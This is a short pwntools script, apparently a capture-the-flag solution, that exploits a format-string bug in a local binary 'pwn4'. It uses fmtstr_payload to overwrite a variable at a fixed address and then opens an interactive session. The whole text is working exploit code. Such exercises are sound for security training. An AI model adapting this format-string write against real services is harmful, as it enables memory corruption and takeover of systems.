from pwn import *
context(arch = 'i386',log_level = 'debug', os = 'linux')
io = process('./pwn4')
#io = remote('ip',port)
Expl0rer = 0x804C060
payload = fmtstr_payload(7,{Expl0rer:6})
io.sendline(payload)
io.interactive()
